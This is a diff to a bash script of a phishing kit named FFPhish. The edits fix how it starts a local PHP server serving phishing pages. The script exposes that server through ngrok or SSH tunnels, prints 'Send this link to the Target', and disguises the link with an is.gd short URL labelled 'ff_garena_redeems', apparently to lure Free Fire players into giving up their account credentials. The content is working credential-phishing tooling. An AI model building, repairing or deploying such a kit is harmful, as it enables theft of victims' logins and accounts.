@@ -196,7 +196,7 @@ getcredentials
 ##
 serverx() {
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd $server && php -S 127.0.0.1:$port index.php > /dev/null 2>&1 & 
+cd $server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
@@ -291,7 +291,7 @@ read port
 port="${port:-${default_port}}"
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd FFPhish/$server && php -S 127.0.0.1:$port index.php> /dev/null 2>&1 & 
+cd FFPhish/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
@@ -302,7 +302,7 @@ cd FFPhish
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target: %s\e[0m\e[1;77m %s\e[0m\n" $link
 
-send_ip=$(lynx --dump 'https://is.gd/create.php?format=simple&url=$send_link&shorturl=ff_garena_redeems')
+send_ip=$(lynx --dump 'https://is.gd/create.php?format=simple&url=$link&shorturl=ff_garena_redeems')
 #send_ip=$'https://is.gd/ff_garena_redeems'
 
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using shortenurl (is.gd):\e[0m\e[1;70m %s \n' $send_ip
